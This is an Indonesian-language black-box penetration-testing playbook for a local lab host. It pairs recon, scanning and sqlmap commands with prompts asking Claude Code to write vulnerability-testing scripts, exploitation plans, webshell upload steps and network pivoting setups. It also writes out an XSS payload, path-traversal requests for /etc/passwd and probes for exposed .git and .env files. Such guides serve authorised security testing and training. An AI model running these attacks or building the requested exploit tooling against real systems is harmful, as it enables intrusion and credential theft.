# Skenario 1: Aplikasi Lokal (10.X.X.X) — Black Box

**Akses:** Jaringan lokal / LAN / VM internal  
**Metode:** Black Box — tidak ada informasi awal selain IP target  
**Contoh target:** `http://10.10.10.5` atau range `10.10.10.0/24`

---

## Informasi Awal yang Tersedia

| Item | Status |
|------|--------|
| URL / IP target | ✓ Diberikan |
| Kredensial (username/password) | ✗ Tidak ada |
| Source code | ✗ Tidak ada |
| Dokumentasi teknis | ✗ Tidak ada |
| Teknologi stack | ✗ Tidak diketahui |

---

## Phase 1: Network Discovery

Karena target di jaringan lokal, mulai dengan menemukan host aktif di subnet.

```bash
# Temukan host aktif di subnet
sudo arp-scan -l
# atau
nmap -sn 10.10.10.0/24 -oN recon/active/host_discovery.txt

# Identifikasi target spesifik
nmap -sn 10.10.10.5
```

**Prompt Claude Code:**
```
Bantu saya menganalisis jaringan lokal 10.10.10.0/24 untuk pentest.
Buatkan bash script yang:
1. Sweep seluruh subnet dengan arp-scan dan nmap ping scan
2. Untuk setiap host yang aktif, jalankan quick port scan (top 100 ports)
3. Simpan hasil ke recon/active/ dengan nama file berdasarkan IP
4. Tampilkan summary: berapa host aktif, port apa yang paling banyak terbuka
```

---

## Phase 2: Service Enumeration

```bash
# Full port scan pada target
nmap -sV -sC -p- 10.10.10.5 \
  -oN scans/nmap/full_scan.txt \
  -oX scans/nmap/full_scan.xml \
  --min-rate 2000

# Jika port 80/443 terbuka, lanjut web enumeration
gobuster dir \
  -u http://10.10.10.5 \
  -w /usr/share/wordlists/dirb/common.txt \
  -o scans/web/gobuster.txt \
  -t 30 --timeout 5s
```

**Prompt Claude Code — Analisis nmap output:**
```
Ini output nmap dari target lokal 10.10.10.5 (lab pentest saya).
Analisis dan tentukan:
1. Service mana yang paling menarik untuk diserang?
2. Versi software yang terdeteksi — ada CVE dikenal?
3. Urutan attack surface dari prioritas tertinggi
4. Command nmap script scan lanjutan untuk service yang ditemukan

[PASTE OUTPUT NMAP]
```

---

## Phase 3: Web Application Fingerprinting

```bash
# Whatweb — identifikasi teknologi
whatweb http://10.10.10.5 -v

# Nikto — vulnerability scan cepat
nikto -h http://10.10.10.5 -o scans/web/nikto.txt -Format txt

# Curl untuk cek header
curl -I http://10.10.10.5
curl -s http://10.10.10.5/robots.txt
curl -s http://10.10.10.5/.git/HEAD  # cek git exposed
curl -s http://10.10.10.5/.env       # cek env file exposed
```

**Prompt Claude Code — Fingerprinting:**
```
Bantu saya fingerprint web app di 10.10.10.5.
Output whatweb: [OUTPUT]
HTTP headers: [HEADERS]
Direktori yang ditemukan gobuster: [DIRS]

Dari informasi ini:
1. Framework/CMS apa yang kemungkinan digunakan?
2. File/direktori mana yang harus dieksplor lebih lanjut?
3. Berikan command untuk enumerate lebih dalam
```

---

## Phase 4: Vulnerability Identification

### Pendekatan Manual

```bash
# Test SQL Injection pada form login
sqlmap -u "http://10.10.10.5/login.php" \
  --data="username=admin&password=test" \
  --dbs --batch \
  -o --output-dir=vulnerabilities/

# Test XSS — cari semua input field
# Payload: <script>alert(1)</script>

# Test file traversal
curl "http://10.10.10.5/download?file=../../../etc/passwd"
curl "http://10.10.10.5/?page=../../../../etc/passwd"
```

**Prompt Claude Code — Otomasi payload testing:**
```
Buatkan Python script untuk test vulnerability dasar pada web app lokal.
Target: http://10.10.10.5
Endpoint yang ditemukan: [LIST ENDPOINT]

Script harus test:
1. SQL injection pada setiap parameter GET dan POST
2. Path traversal pada parameter yang tampak seperti filename/path
3. Command injection pada form input
4. Simpan semua temuan ke vulnerabilities/findings.json
Rate limit: 1 request per 0.5 detik
```

---

## Phase 5: Exploitation

**Prompt Claude Code — Berdasarkan temuan:**
```
Target lokal 10.10.10.5 (lab yang diotorisasi). Temuan:
- SQL injection pada /login.php parameter 'user'
- Versi Apache: 2.4.49
- Direktori /uploads/ dapat diakses

Berikan exploitation plan step-by-step:
1. Exploit SQLi untuk bypass login atau dump credentials
2. Cek CVE Apache 2.4.49 dan cara eksploitasinya
3. Jika ada file upload, bagaimana upload webshell?
4. Berikan command/script untuk setiap langkah
```

---

## Phase 6: Post-Exploitation & Pivot

Karena ini jaringan lokal, post-exploitation bisa mencakup pivoting ke host lain.

```bash
# Jika berhasil RCE, kumpulkan info jaringan
ip route
arp -a
cat /etc/hosts

# Pivot scan dari host yang dikompromikan
# (menggunakan proxychains + socks5 tunnel)
```

**Prompt Claude Code:**
```
Saya mendapat RCE pada 10.10.10.5 di jaringan lokal.
Output 'ip route': [OUTPUT]
Output 'arp -a': [OUTPUT]

Apakah ada host lain yang bisa di-pivot? Bagaimana setup proxychains
untuk scan internal network dari shell yang sudah didapat?
```

---

## Checklist Black Box Lokal

```
[ ] Host discovery seluruh subnet
[ ] Full port scan pada target
[ ] Service version identification
[ ] Web technology fingerprinting
[ ] Directory & file enumeration
[ ] Manual testing: SQLi, XSS, LFI/RFI, IDOR
[ ] Automated scan: nikto, sqlmap, nuclei
[ ] Exploit temuan kritis
[ ] Post-exploitation recon
[ ] Dokumentasi semua temuan + screenshot
[ ] Draft laporan
```

---

## Output / Deliverable

```
pentest-project/
├── recon/active/
│   ├── host_discovery.txt
│   └── 10.10.10.5_recon.txt
├── scans/
│   ├── nmap/full_scan.txt
│   └── web/gobuster.txt, nikto.txt
├── vulnerabilities/
│   └── findings.json
├── exploits/
│   └── sqli_bypass.py
└── reports/
    └── report_10.10.10.5_blackbox.md
```
